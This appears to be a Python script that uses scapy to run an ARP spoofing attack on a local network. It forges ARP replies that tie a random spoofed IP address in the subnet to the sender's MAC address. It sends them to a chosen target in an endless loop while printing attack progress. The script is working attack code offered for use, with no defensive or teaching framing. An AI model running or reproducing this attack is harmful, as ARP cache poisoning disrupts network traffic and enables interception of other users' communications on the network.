from scapy.layers.l2 import ARP
from scapy.layers.inet import Ether
from scapy.sendrecv import sendp, sendpfast, srploop
import Ips
import psutil


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


nics = psutil.net_if_addrs()[list(psutil.net_if_addrs())[0]]

# srcMAC=input("Enter source MAC address: ")
# srcIP=input("Enter source IP address: ")
# dstMAC=input("Enter destination MAC address: ")
# dstIP=input("Enter destination IP address: ")
def randomIP(ip):
    import random
    while True:
        rn=ip.split(".")
        rn=".".join(rn[:3])+"."
        rn+=str(random.randint(1,220))
        if rn!=ip:
            return rn

from termcolor import colored
import colorama
from colorama import Fore, Back, Style
colorama.init()


srcMAC=nics[0].address.replace("-",":")
dstIP,dstMAC=Ips.getAllIps(choice=0)
srcIP,srcMAC=Ips.getAllIps()
srcMAC=srcMAC.replace("-",":")
dstMAC=dstMAC.replace("-",":")
y=Ether(src=srcMAC,dst=dstMAC)/ARP(hwtype=1,ptype=0x00000800,hwlen=6,plen=4,op=2,psrc=randomIP(srcIP),pdst=dstIP,hwsrc=srcMAC,hwdst=dstMAC)
print(Fore.GREEN+"Start the"+Fore.RED+" Attack")
print(Fore.RED+"Attacking IP: "+Fore.CYAN+srcIP+Fore.RED+" MAC:"+Fore.CYAN+" "+srcMAC)
print(Style.RESET_ALL+"Good Luck")
counter=0
while True:
    counter+=1
    sendp(y,iface="Realtek PCIe GbE Family Controller",verbose=False)
    if counter%10000==0:
        print(f"sent {counter} packets")
